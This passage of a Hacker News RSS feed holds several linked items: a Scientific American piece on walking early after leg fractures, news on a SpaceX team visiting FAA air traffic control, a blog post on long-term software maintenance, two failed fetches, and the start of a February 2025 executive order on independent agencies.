<div id="readability-page-1" class="page"><div><div><p>February 18, 2025</p><p>4<!-- --> min read</p></div><p>Using crutches for months is largely a thing of the past. Early weight-bearing has real benefits</p><figure><img src="https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=600" alt="Illustration of a person's legs, transparent, bones showing" srcset="https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=600 600w, https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=900 900w, https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=1000 1000w, https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=1200 1200w, https://static.scientificamerican.com/dam/m/2536f2bc1f78d195/original/sa0325SoH01.jpg?m=1738864029.009&amp;w=1350 1350w" sizes="(min-width: 900px) 900px, (min-resolution: 2dppx) 75vw, (min-resolution: 2.1dppx) 50vw, 100vw" fetchpriority="high"><figcaption> <p>Jay Bendt</p></figcaption></figure></div><div><p data-block="sciam/paragraph">Twenty years ago my husband, Mark, broke his left ankle and was in a cast and on crutches for nearly two months. Last year he broke the other ankle. But this time, after surgery, his doctor surprised us by instructing Mark to walk on it two weeks later.</p><p data-block="sciam/paragraph">It turns out the standard advice to stay off a broken leg bone for at least six weeks is based less on scientific evidence and more on cultural caution—physicians like to play it safe. But now studies show that complications are no more likely with early weight-bearing than with a long delay. Except in a few complex cases, walking around earlier helps broken bones heal, and it improves quality of life: for example, people can return to work and other activities faster.</p><p data-block="sciam/paragraph">If you are fully immobilized, “you come out of the cast with a sort of hairy, withered leg that takes forever to overcome,” says orthopedic trauma surgeon Alex Trompeter of St. George’s University of London. “The science tells us that the rate at which you lose muscle mass is far faster than the rate at which you gain it.” You’re slow to build bone, too. Consider astronauts. After six months in zero gravity at the International Space Station, they lose 10 percent of their bone density, and to ward off that loss they do exercises in space that are equivalent to bearing weight.</p><hr><h2>On supporting science journalism</h2><p>If you're enjoying this article, consider supporting our award-winning journalism by<!-- --> <a href="https://www.scientificamerican.com/getsciam/">subscribing</a>. By purchasing a subscription you are helping to ensure the future of impactful stories about the discoveries and ideas shaping our world today.</p><hr><p data-block="sciam/paragraph">In the 19th century German surgeon and anatomist Julius Wolff recognized that healthy bones adapt and change in response to the load placed on them. That is why everyone—but especially women, who are more susceptible than men to osteoporosis—should lift weights as they age. It increases bone density.</p><blockquote data-block="contentful/pullquote"><p>Those who walked early on femurs that had broken just above the knee had no higher rate of complications than those who stayed off the leg for six weeks.</p></blockquote><p data-block="sciam/paragraph">When you fracture a bone anywhere in the body, physicians first worry about stability. How much will the bone fragments move if you put weight on them? If the answer is too much, surgery is usually indicated—first a “reduction” to realign the pieces of bone and then “fixation” to hold them in place with screws, plates or rods.</p><p data-block="sciam/paragraph">That procedure sets up a bone, which is living tissue, to heal naturally by making new bone and resorbing damaged cells. In the gap caused by a fracture, a healing tissue called callus forms first, which then turns into bone. The right amount of load or movement (here’s where Wolff’s discovery applies) is critical to this process. Too little results in no callus; too much prevents the bone from knitting back together. “It’s all about the strain environment,” says orthopedic surgeon Chris Bretherton of Queen Mary’s Hospital in London.</p><p data-block="sciam/paragraph">Surgical implants hold the alignment until that process is complete. “It’s a little bit of a race postoperatively between the bone healing and the fixation breaking,” says orthopedic trauma surgeon Marilyn Heng of the University of Miami Miller School of Medicine. In that contest, she roots for the new bone. “Once the body heals and forms bone across the fracture site, the hardware we put in becomes extraneous. The crux of our decisions for weight-bearing status is we want to win that race.”</p><p data-block="sciam/paragraph">And putting some load on the bones aids that goal. Although the process of bone healing is the same all over the body, bones in the lower limbs such as hips, femurs and ankles bring extra complications because they affect the ability to walk. In patients with hip fractures—predominantly frail, older people—that immobility can lead to dire consequences.</p><p data-block="sciam/paragraph">Some patients do not have the dexterity and strength to manage partial weight-bearing while using crutches, so they stay in bed. The lack of movement leads to serious problems such as blood clots and weakening of the lungs. One 2005 study found that nine percent of hip fracture patients died within 30 days of breaking a hip and that 30 percent died within the first year. But more recent studies of healing hips suggest that early weight-bearing decreases mortality rates, and doctors have altered their practices. “The normal standard of care is [now] to fix it and let people walk,” Trompeter says.</p><p data-block="sciam/paragraph">Breaks in long bones, like the femur in your thigh, can be relatively straightforward to repair with a rod. In a study that looked back at outcomes for a series of patients, Heng and her colleagues showed that those who walked early on femurs that had broken just above the knee had no higher rate of complications than those who stayed off the leg for six weeks.</p><p data-block="sciam/paragraph">For ankles, the largest randomized controlled trial to date (480 fracture cases across 23 centers in the U.K.) was published in 2024 in the <i>Lancet</i>. Half of the patients were instructed to walk after two weeks, and the other half were told to wait until after six weeks. Any complications, such as infections or broken plates, were equally common in both groups, so early walking didn’t pose a greater risk. And the early weight-bearing group reported better function in the ankle at six weeks and at four months postsurgery. “Surgeons just needed a push,” says Bretherton, who led the study. He hopes this evidence “gives them that confidence.”</p><p data-block="sciam/paragraph">As for my husband, he jumped at the chance to get moving sooner. In less than two months, the point at which he was just coming out of a cast last time, his scar was fully healed, he was walking normally and, with a few limitations—no running, no quick pivots—he was exercising again. It seems that he won this race.</p><p data-block="sciam/paragraph"><i>This is an opinion and analysis article, and the views expressed by the author or authors are not necessarily those of </i>Scientific American.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Greg K-H: "Writing new code in Rust is a win for all of us" (104 pts)]]></title>
            <link>https://lore.kernel.org/rust-for-linux/2025021954-flaccid-pucker-f7d9@gregkh/</link>
            <guid>43101204</guid>
            <pubDate>Wed, 19 Feb 2025 12:12:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lore.kernel.org/rust-for-linux/2025021954-flaccid-pucker-f7d9@gregkh/">https://lore.kernel.org/rust-for-linux/2025021954-flaccid-pucker-f7d9@gregkh/</a>, See on <a href="https://news.ycombinator.com/item?id=43101204">Hacker News</a></p>
Couldn't get https://lore.kernel.org/rust-for-linux/2025021954-flaccid-pucker-f7d9@gregkh/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[A SpaceX team is being brought in to overhaul FAA's air traffic control system (101 pts)]]></title>
            <link>https://www.theverge.com/news/614078/faa-air-traffic-control-spacex-elon-musk-layoff-staff-shortage</link>
            <guid>43101009</guid>
            <pubDate>Wed, 19 Feb 2025 11:39:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/news/614078/faa-air-traffic-control-spacex-elon-musk-layoff-staff-shortage">https://www.theverge.com/news/614078/faa-air-traffic-control-spacex-elon-musk-layoff-staff-shortage</a>, See on <a href="https://news.ycombinator.com/item?id=43101009">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="zephr-anchor"><p>A team from Elon Musk’s SpaceX is visiting the Air Traffic Control Command Center in Virginia Monday to help overhaul the system in the wake of last month’s deadly air disaster in Washington, DC, US Secretary of Transportation Sean Duffy announced. The news comes <a href="https://edition.cnn.com/2025/02/16/politics/faa-employees-fired-trump-administration/index.html">after CNN reported</a> that the Federal Aviation Administration fired hundreds of probationary employees who maintain critical air traffic control infrastructure.</p><p>The exact number of workers losing their jobs is unknown, but the union representing them said it was in the “hundreds.” The Trump administration is in the process of trying to <a href="https://www.theverge.com/policy/605611/trump-elon-musk-federal-government-employee">eliminate thousands of federal employees</a> as it works with Congressional Republicans on a massive tax cutting bill that is said to <a href="https://www.cbpp.org/press/statements/house-republican-budget-would-mean-higher-costs-less-help-for-families-more-tax">favor mostly corporations and the wealthy</a>.</p><p>Elon Musk, the richest man in the world, is playing a key role in the mass terminations from his perch at the <a href="https://www.theverge.com/politics/608528/elon-musk-doge-government-takeover-what-to-know">Department of Government Efficiency</a>. And as critics have noted, Musk’s status as a major government contractor — <a href="https://www.reuters.com/world/us/elon-musks-us-department-defense-contracts-2025-02-11/">mostly through his company SpaceX</a> — represents a massive conflict of interest that both he and President Donald Trump have repeatedly <a href="https://www.cnn.com/2025/02/11/politics/musk-trump-conflicts-of-interest/index.html">attempted to downplay</a>.</p><p>In a post on X, Duffy said the team from SpaceX went to Virginia to “get a firsthand look at the current system, learn what air traffic controllers like and dislike about their current tools, and envision how we can make a new, better, modern and safer system.” Previously, <a href="http://x.com/SecDuffy/status/1887209012867047525">Duffy said</a> that Musk’s DOGE team would “plug in” to the FAA to help “upgrade our aviation system.”</p><p>Duffy also dismissed criticism about opening the door to a Musk-led team to another sensitive area of the federal government. “Because I know the media (and Hillary Clinton) will claim Elon’s team is getting special access, let me make clear that the @FAANews regularly gives tours of the command center to both media and companies,“ Duffy said. (Clinton has <a href="https://x.com/HillaryClinton/status/1887246526285537644">previously criticized</a> the DOGE team’s lack of experience.)</p><div><p>“I know the media (and Hillary Clinton) will claim Elon’s team is getting special access”</p></div><p>The FAA is under heightened scrutiny three weeks after a midair collision over the Potomac River resulted in the deaths of 67 people. The tragedy highlighted shortages of air traffic controllers as well as congestion at major hubs like Ronald Reagan National Airport. The FAA <a href="https://www.nytimes.com/2023/12/02/business/air-traffic-controllers-safety.html?partner=slack&amp;smid=sl-share">has fielded hundreds of complaints</a> from air traffic workers describing dangerous conditions from staff shortages to dilapidated buildings. And the agency itself lacked a permanent head at the time of the crash — mostly because <a href="https://www.theverge.com/news/603113/faa-chief-musk-dc-plane-crash-crisis">Musk had a hand in ousting the last administrator</a> after the FAA fined SpaceX for failing to submit safety data.</p><p>Duffy’s post doesn’t mention Musk’s role in the ouster, nor the hundreds of workers who were just laid off. CNN says the probationary employees were likely targeted because they’ve been employed for less than a year and lack the right to appeal.</p><p>“This draconian action will increase the workload and place new responsibilities on a workforce that is already stretched thin,” David Spero, National President of the Professional Aviation Safety Specialists, AFL-CIO, <a href="https://www.passnational.org/index.php/news/873-pass-statement-on-firing-of-probationary-employees-at-faa">said in a statement</a>. “This decision did not consider the staffing needs of the FAA, which is already challenged by understaffing.” </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The reality of long-term software maintenance from the maintainer's perspective (113 pts)]]></title>
            <link>https://www.construct.net/en/blogs/ashleys-blog-2/reality-long-term-software-1892</link>
            <guid>43100648</guid>
            <pubDate>Wed, 19 Feb 2025 10:35:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.construct.net/en/blogs/ashleys-blog-2/reality-long-term-software-1892">https://www.construct.net/en/blogs/ashleys-blog-2/reality-long-term-software-1892</a>, See on <a href="https://news.ycombinator.com/item?id=43100648">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                    <p>I was reading about a <a href="https://www.construct.net/out?u=https%3a%2f%2farstechnica.com%2fgadgets%2f2025%2f02%2fasahi-linux-lead-resigns-from-mac-based-distro-after-tumultuous-kernel-debate%2f" target="_blank" rel="nofollow noopener external" title="Go to: https://arstechnica.com/gadgets/2025/02/asahi-linux-lead-resigns-from-mac-based-distro-after-tumultuous-kernel-debate/">dispute involving the Linux kernel</a> recently (which for the record I don't think either side handled well), and I realised something: <strong>very few people seem to understand the reality of maintaining large software projects in the long term.</strong> Of course non-technical people won't understand it, and likely inexperienced developers don't really understand it - but what I've noticed is even experienced software developers who are capable of writing a large and complex codebase don't always seem to understand it. That seems to have been a factor in that Linux kernel dispute (although there were several other factors).
</p>

<p>I think this lack of understanding contributes to some common remarks you come across in software development, such as:
</p>

<ul>
	<li><em>"I could write that in a weekend!"</em> (often regarding some major product like Dropbox)</li>
	<li><em>"Just integrate &lt;some library&gt; - it does that feature for you"</em></li>
	<li><em>"Here, I've made a prototype - take it and integrate it in to your product!"</em></li>
	<li><em>"I've made a cool plugin - why not make it built-in to the base product?"</em></li>
	<li><em>"Why won't this open source project accept my 10,000 lines of code patch? I've done all the hard work!"</em></li>
</ul>

<p>The reality is, if you maintain a large and complex software project over a period of many years, you come to realise a key point: <strong>writing the initial code for a feature is only a fraction of the work</strong>, once you take in to account everything else you also have to do in the long term. I think unless in your career you've had the responsibility for maintaining a large (100,000+ lines of code) and continually evolving codebase for 5+ years, it's probably difficult to appreciate the substantial challenges that are unique to this.
</p>

<h2>Our experience</h2>
<p>In our case, our browser-based game and animation tool <a href="https://www.construct.net/" target="_blank" rel="noopener" title="Make your own games">Construct</a> currently stands at around 750,000 lines of code, and its first lines of code were laid down about a decade ago. (It's also our third-generation product, with Construct 2 and Construct Classic before that - we started in around 2007.) I would estimate that writing the initial code for a feature is about <strong>25% of the total work</strong> involved for that feature. <strong>The rest is maintenance</strong> - testing, diagnosing and fixing bugs, optimising performance, upgrading it to work with other changes, refactoring, customer support, writing documentation and similarly revising the documentation over time, and possibly ultimately rewriting the code (and then further maintenance still continues beyond that).
</p>

<p>In the grand scheme of things, Construct isn't even that big: browsers, operating systems like Linux, and many other projects run in to the many millions of lines of code. In those cases I wouldn't be surprised if the ratio is more like 10%, or even less.
</p>

<p>Once you've been burned a few times by having to do an <a href="https://www.construct.net/en/blogs/ashleys-blog-2/unexpected-complications-1535" target="_blank" rel="noopener" title="Make your own games">extraordinary amount of work for a small change</a>, or having an exciting new upgrade planned but then you realise some particular feature is a major problem that blocks the upgrade, or having to completely rewrite a major feature involving someone else's code and finding all sorts of complications in it - all of which has happened to us - then you start to really appreciate this. I think many people, including experienced developers, view software development as hammering out the necessary lines of code, and then job done. Perhaps that's true in some jobs! But for projects like ours, that's <strong>far from the case.</strong>
</p>

<h2>The maintainer's perspective</h2>
<p>Once you truly understand this, then you start to see things very differently. To many on the outside, seeing someone submitting 10,000 lines of code for a new feature in an open-source project is a generous, helpful person who deserves respect and co-operation from the developers. However experienced developers responsible for the codebase will be well aware that person may suddenly disappear off the face of the earth - and then once you consider the long term, they've essentially <strong>dumped responsibility for perhaps 4-10x as much work</strong> as they've done themselves <strong>on to the project's other developers.</strong> If they quite reasonably decide they'd rather not deal with that, then this becomes a very thorny diplomatic problem: how do you politely turn down someone who appears to have been so generous? In the case of that Linux kernel dispute, this seems to have been part of the point the kernel developers were trying to make. (However they used what I'd call extremely undiplomatic language which looks to have added to the acrimony.)
</p>

<h2>A construction analogy</h2>
<p>Software is a very abstract thing, and I think that makes it <strong>harder to have an intuition about.</strong> So to help explain how it works from the maintainer's point of view, I've come up with an analogy involving building a house. No analogy is perfect, and I don't have any construction experience, but it's easier to have intuition about real-world physical things that we've all experienced, so hopefully it conveys the point well enough.
</p>

<h3>A volunteer builder</h3>
<p>Suppose you're an experienced builder and you decide to <strong>build yourself a new house from the ground up.</strong> You take care to use the best materials and techniques for a robust house that will last for decades to come.
</p>

<p>Then suppose a younger relative just starting out in construction makes you an offer: they suggest they'll <strong>build an extension of the building for free!</strong> You can rent out the space and make money too! And they get real-world experience and something to put on their CV. Everyone says what a wonderful offer it is and how generous they are to do that for you. So you accept and they get to work on their extension.
</p>

<p>Gradually you realise that they are working quickly, using cheap materials and basic techniques. You know to go above and beyond to make a building that lasts, but they do the minimum necessary. There is some complicated work to combine the plumbing, heating and electrics between your section and theirs. But hey, they're providing their bit for free, so you may as well take it, right?
</p>

<p>The work finishes and everything looks OK: both sections have all relevant utilities, are waterproof, are habitable, and comply with regulations, so it seems good enough. You high-five your relative, who mentions perhaps you owe them one, and then they disappear off on to the rest of their career.
</p>

<h3>Maintenance problems arise</h3>
<p>Fast-forward ten years. Your part of the construction is robust and still going strong. However the extension your relative build is having serious problems. The roof is leaking; the insulation is poor and wasting money on heating bills; the electrics keep tripping, affecting both properties. You are making money from renting it to tenants, but now they are complaining about these problems. You do the necessary work to maintain it and keep it going, but eventually it becomes clear: <strong>this structure is not going to last much longer.</strong> The problems are getting worse, and it is starting to need <strong>drastic maintenance</strong>: the roof needs replacing; it needs rewiring; those walls should probably have been built to the same standards as yours in the first place; and so on. However you have tenants living there, who have rights, and you can't just kick them out straight away. They've been complaining regularly about all the maintenance problems and it's been a big source of stress.
</p>

<h3>The maintainer's nightmare</h3>
<p>Now you're in the maintainer's nightmare. The easiest thing to do would be to demolish the extension and not replace it. In the software world, that is often too difficult to do for backwards-compatibility reasons. So in this analogy, let's say you are obligated to provide the tenants with a place to live. So now you have a range of bad options:
</p>

<ul>
<li>You could just keep <strong>patching things over time.</strong> But you know it's only going to get worse and consume more time and money and cause more stress. So that's not an option.</li>
<li>You could try <strong>asking your relative back to do a load more free work.</strong> Chances are though they'll say sorry, they've done enough free work already, and perhaps in fact it's you who owes them a favour. Perhaps they moved away and there's no chance of getting them back anyway.</li>
<li>You could <strong>demolish and rebuild the extension</strong>, but you will need to temporarily house the current tenants somewhere else while you do the rebuilding, which makes it much more expensive. (In software, this might be using complicated workarounds, or writing dedicated code to handle the transition).</li>
<li>You could <strong>build a whole new extension somewhere else</strong>, move the tenants over, and then <strong>demolish the old extension.</strong> This is a good solution, but you have to have the space to do it, and you have to make sure the new extension has everything the old one did, while being better quality. Meanwhile, during construction - which may take a very long time - you still have to deal with all the maintenance problems of the old extension. So things will get worse before they get better. (In software, this might be writing an entirely separate new feature, and then migrating everyone over, which can be very tricky to pull off.)</li>
<li>You could <strong>rebuild the extension, but in stages</strong>, while the tenants are still living there. This will be awful for the tenants as they'll be living in a building site for months, but they don't have to move. It is also by far the most complicated solution, as a lot of building work has to be done while at every stage providing a habitable building. This likely makes it the slowest and most expensive option - but sometimes you have to do it if other constraints make the other options impossible. (In software, this would be upgrading the existing code in pieces over time, while ensuring it keeps working with backwards compatibility.)</li></ul>

<h3>The realisation</h3>
<p>There are no good options. Suppose you pick an option and after a time-consuming and expensive rebuilding project, you have a terrible realisation: the time and cost you've invested have completely negated all the rental income you've ever received, or will receive for the next several years. With regret you come to a final realisation: <em>it would be better to have never had the extension at all</em>. You'd have <em>saved</em> money, and had far less stress.
</p>

<p>That's when you become wise to the risks of outside contributions. You realise: <em>they</em> built the first structure, but they left <em>me</em> with the long-term responsibility of managing it - a responsibility ultimately involving more work than the initial construction, and that ultimately caused so much trouble and expense that <em>I'd rather they never did it in the first place</em>, or alternatively <em>I wish I just built it myself</em>.
</p>

<p>This is regrettable, but unfortunately this is sometimes the reality. Perhaps in some cases everything works out great. But nobody can really be sure - who knows how things will play out in 5-10 years, what upgrades will become necessary, or what maintenance problems will come up? So experienced maintainers become <strong>extremely wary</strong> of contributions from anyone who isn't <em>very likely</em> to still be there and helping many years down the line.
</p>

<h3>Diplomacy</h3>
<p>This then creates a thorny diplomatic problem when people propose things like substantial prototypes, patches, or libraries - the software world's equivalent to our analogy of building an extension. If you ask "will <em>you</em> maintain this?", they may well answer "Sure!", do it for a while, then ultimately stop and move on to something else. Maintainers don't tend to ask the question directly, as they know there is no guarantee of help from the outside and over many years most people move on. Instead the maintainer will usually respond with scepticism, resistance, and extremely stringent requirements. For example in the analogy this might be insisting the extension was built to the same high standard as the rest of the building. But overseeing this still requires time and effort from the maintainer, who may have their own priorities they'd rather be spending time on. It can also cause friction with the contributor, who may take the stance "this is already sufficient, why force me to keep going?" because they don't yet have the deep experience necessary to fully appreciate the difference between what's good enough now and what will still be good enough in 10 year's time.
</p>

<p>From the outside this can look like needlessly bureaucratic and un-cooperative behaviour by the maintainer, and end up with accusations of intransigence and dictatorial behaviour, which can then degrade in to rudeness and acrimony. The fundamental problem though is the maintainers are thinking "this may well end up with us doing 75-90% of the work on this feature, so we want to be absolutely sure we are willing to do that".
</p>

<h2>Software examples</h2>
<p>Back in the world of software, even with just our Construct products, we've been through this kind of thing several times, despite the fact it's not open source. Here are some real-world examples:
</p>

<ul>
	<li>Construct 2 used a storage plugin contributed by a community member. After a few years we replaced it with an in-house one, but customer projects could keep using the old one for backwards compatibility. Despite that happening around 10 years ago, and releasing a whole new product Construct 3 since then, <a href="https://www.construct.net/en/forum/construct-3/how-do-i-8/download-webstorage-185328" target="_blank" rel="noopener" title="Make your own games">customers still run in to backwards-compatibility problems</a> with the old community-contributed plugin.</li>
	<li>Once it was suggested we add new features faster by contracting outside developers to do them. We tried this with our official Sprite Font plugin. The original developer became unreachable, and found it extremely difficult dealing with bug fixes and feature requests relating to the other developer's code, who used a substantially different coding style. In the end we had to rewrite all our plugins for Construct 3, and so we ended up rewriting all the code anyway, which was particularly challenging given we hadn't written it ourselves in the first place and didn't have a deep understanding of how it worked. It's far easier now it's all our own code.</li>
	<li>Sometimes we add a third-party library to implement some feature. The library developer continues to support it for say 5 years, and then moves on. Then 10 years later we're still stuck with the library and struggling with bug fixes and improvements, and having to face either rewriting it ourselves or migrating to some other library (which might then stop being supported later too). With Construct I think we're now on our fourth library for minifying JavaScript code, having repeatedly switched due to maintenance difficulties, and switches often being really painful and time-consuming projects.</li>
	<li>Sometimes people write a prototype or a proof-of-concept for a feature in a day or two, and then pressure us to implement it in Construct because they believe they've demonstrated how easy it is. However we know they've only done a fraction of the work.</li>
	<li>Sometimes people use developer tools or encapsulation-breaking features to directly hack some feature in to the codebase, and then ask why we don't officially support it. However we know how much of a challenge long-term maintenance is; sometimes we also know there are possible future upgrades that we'd like to do that would conflict with that feature and cause a serious backwards-compatibility problem. The person demonstrating their change usually doesn't seem to care about this at all and just wants their thing to work now, but we know we're the ones dealing with the long-term fallout.</li>
</ul>

<p>For open-source projects it's probably much harder as in theory anyone can directly contribute a large amount of code, and many projects actively encourage this. I would guess if you just accept any code from anyone then it won't be long before the whole thing implodes, so the developers running the project will need some kind of requirements for submissions. However I can't really speak to this having not had much experience of open source projects, so really on this aspect I'm just on the side-lines pointing out what I think is part of the problem in cases like the Linux kernel dispute.
</p>

<h2>Conclusion</h2>
<p>Software is abstract and hard to have an intuition about. I suspect working on the same large complex evolving codebase for 5+ years is relatively rare in the industry - like I say some developers seem perfectly capable of writing a large amount of complex code, but appear to have little appreciation for maintenance considerations. Long-term software maintenance is surprisingly like maintaining physical thing like a building. Obviously over time a building needs maintenance, repairs, and the occasional part replaced; in the very long run major works may be needed such as replacing the roof. Software needs that too, despite the fact those 1s and 0s don't physically degrade. The term <a href="https://www.construct.net/out?u=https%3a%2f%2fen.wikipedia.org%2fwiki%2fSoftware_rot" target="_blank" rel="nofollow noopener external" title="Go to: https://en.wikipedia.org/wiki/Software_rot">software rot</a> aptly describes how unmaintained software still degrades over time, almost like some organic substance that starts to rot, even if the actual program data is perfectly preserved. As a software developer you usually have to stick around for a very long time before you start to find the software rot in your own code, start learning lessons the hard way, and gain that deep experience in long-term software maintenance.
</p>

<p>I'm reminded of the <a href="https://www.construct.net/out?u=https%3a%2f%2fwww.goodreads.com%2fquotes%2f835238-indeed-the-ratio-of-time-spent-reading-versus-writing-is" target="_blank" rel="nofollow noopener external" title="Go to: https://www.goodreads.com/quotes/835238-indeed-the-ratio-of-time-spent-reading-versus-writing-is">quote by Robert C. Martin</a> about programming: <em>"the ratio of time spent reading versus writing is well over 10 to 1."</em> That's in part because writing the initial code for a feature in a large long-term software project is only a fraction of the work. In the long run <strong>maintenance is a majority of the work</strong> for any given feature, and <strong>responsibility for maintenance defaults to the project maintainers</strong>. All too often a proposal to use some code is in fact putting the burden of responsibility for the majority of the work on someone else, even when it is done in good faith. If you suggest some software project uses some code - even a small amount - will <em>you</em> be there in literally 10 year's time sorting out all the issues that arise from it? Usually the answer is no. Often the maintainers know they will be though. It looks like one approach the Linux kernel developers have to this question is to favour code submitted by people who have been contributing for many years already, while being extremely sceptical of code from newcomers. This has the downside of looking like a formidable and unwelcoming community, but it illustrates the level of commitment that is needed to be able to maintain a codebase over a span of decades. It's a level of commitment that in reality not everyone will live up to, even when they genuinely and in good faith fully intend to.
</p>

<p>Hopefully by illustrating this point we can talk about software improvements in a more realistic way, being able to negotiate the often tricky human dynamics of proposing and contributing improvements to large software projects, whether it's Construct or the Linux kernel.</p>
                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A few hours ago, the US has turned into a de-facto dictatorship (144 pts)]]></title>
            <link>https://old.reddit.com/r/law/comments/1isvzgu/the_full_executive_order_is_out_this_is_the</link>
            <guid>43099826</guid>
            <pubDate>Wed, 19 Feb 2025 08:15:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://old.reddit.com/r/law/comments/1isvzgu/the_full_executive_order_is_out_this_is_the">https://old.reddit.com/r/law/comments/1isvzgu/the_full_executive_order_is_out_this_is_the</a>, See on <a href="https://news.ycombinator.com/item?id=43099826">Hacker News</a></p>
Couldn't get https://old.reddit.com/r/law/comments/1isvzgu/the_full_executive_order_is_out_this_is_the: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Ensuring Accountability for All Agencies (477 pts)]]></title>
            <link>https://www.whitehouse.gov/presidential-actions/2025/02/ensuring-accountability-for-all-agencies/</link>
            <guid>43098705</guid>
            <pubDate>Wed, 19 Feb 2025 04:49:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.whitehouse.gov/presidential-actions/2025/02/ensuring-accountability-for-all-agencies/">https://www.whitehouse.gov/presidential-actions/2025/02/ensuring-accountability-for-all-agencies/</a>, See on <a href="https://news.ycombinator.com/item?id=43098705">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>


<main>
	<div>




<p>&nbsp;By the authority vested in me as President by the Constitution and the laws of the United States of America, it is hereby ordered: &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;<span>Section</span>&nbsp;<span>1</span>. &nbsp;<span>Policy and Purpose</span>. &nbsp;The Constitution vests all executive power in the President and charges him with faithfully executing the laws. &nbsp;Since it would be impossible for the President to single-handedly perform all the executive business of the Federal Government, the Constitution also provides for subordinate officers to assist the President in his executive duties. &nbsp;In the exercise of their often-considerable authority, these executive branch officials remain subject to the President’s&nbsp;ongoing supervision and control. &nbsp;The President in turn is regularly elected by and accountable to the American people. &nbsp;This is one of the structural safeguards, along with the separation of powers between the executive and legislative branches, regular elections for the Congress, and an independent judiciary whose judges are appointed by the President by and with the advice and consent of the Senate, by which the Framers created a Government accountable to the American people.  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;However, previous administrations have allowed so-called “independent regulatory agencies” to operate with minimal Presidential supervision. &nbsp;These regulatory agencies currently exercise substantial executive authority without sufficient accountability to the President, and through him, to the American people. &nbsp;Moreover, these regulatory agencies have been permitted to promulgate significant regulations without review by the President. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;These practices undermine such regulatory agencies’ accountability to the American people and prevent a unified and coherent execution of Federal law. &nbsp;For the Federal Government to be truly accountable to the American people, officials who wield vast executive power must be supervised and controlled by the people’s&nbsp;elected President.  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;Therefore, in order to improve the administration of the executive branch and to increase regulatory officials’ accountability to the American people, it shall be the policy of&nbsp;the executive branch to ensure Presidential supervision and control of the entire executive branch. &nbsp;Moreover, all executive departments and agencies, including so-called independent agencies, shall submit for review all proposed and&nbsp;final significant regulatory actions to the Office of Information and Regulatory Affairs (OIRA) within the Executive Office of the President before publication in the&nbsp;<em>Federal Register</em>.&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;<span>Sec</span>.&nbsp;<span>2</span>. &nbsp;<span>Definitions</span>. &nbsp;For the purposes of this order:</p>



<p>&nbsp; &nbsp; &nbsp;(a) &nbsp;The term “employees” shall have the meaning given that term in section 2105 of title 5, United States Code.  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(b) &nbsp;The term “independent regulatory agency” shall have the meaning given that term in section 3502(5) of title 44, United States Code. &nbsp;This order shall not apply to the Board of Governors of the Federal Reserve System or to the Federal Open Market Committee in its conduct of monetary policy. &nbsp;This order shall apply to the Board of Governors of the Federal Reserve System only in connection with its conduct and authorities directly related to its supervision and regulation of financial institutions. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(c) &nbsp;The term “independent regulatory agency chairman” shall mean, with regard to a multi-member independent regulatory agency, the chairman of such agency, and shall mean, with regard to a single-headed independent regulatory agency, such agency’s&nbsp;chairman, director, or other presiding officer.   &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(d) &nbsp;The term “head” of an independent regulatory agency shall mean those appointed to supervise independent regulatory agencies and in whom the agencies’ authorities are generally vested, encompassing the chairman, director, or other presiding officer, and, as applicable, other members, commissioners, or similar such officials with responsibility for supervising such agencies.  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;Sec.&nbsp;3. &nbsp;OIRA Review of Agency Regulations. &nbsp;(a) &nbsp;Section 3(b) of Executive Order 12866 of September 30, 1993 (“Regulatory Planning and Review”), as amended, is hereby amended to read as follows:  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;“(b)&nbsp; “Agency,” unless otherwise indicated, means any authority of the United States that is an “agency” under 44&nbsp;U.S.C. 3502(1), and shall also include the Federal Election Commission. &nbsp;This order shall not apply to the Board of Governors of the Federal Reserve System or to the Federal Open Market Committee in its conduct of monetary policy. &nbsp;This order shall apply to the Board of Governors of the Federal Reserve System only in connection with its conduct and authorities directly related to its supervision and regulation of financial institutions.”.</p>



<p>&nbsp; &nbsp; &nbsp;(b) &nbsp;The Director of the Office of Management and Budget (OMB) shall provide guidance on implementation of this order to the heads of executive departments and agencies newly submitting regulatory actions under section 3(b) of Executive Order 12866. &nbsp;Agency submissions by independent regulatory agencies under such section shall commence within the earlier of 60 days from the date of this order, or completion of such implementation guidance. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;<span>Sec</span>.&nbsp;<span>4</span>. &nbsp;<span>Performance Standards and Management Objectives</span>. &nbsp;The Director of OMB shall establish performance standards and management objectives for independent agency heads, as appropriate and consistent with applicable law, and report periodically to the President on their performance and efficiency in attaining such standards and objectives.&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;<span>Sec</span>.&nbsp;<span>5</span>. &nbsp;<span>Apportionments for Independent Regulatory Agencies</span>. &nbsp;The Director of OMB shall, on an ongoing basis:  &nbsp;</p>



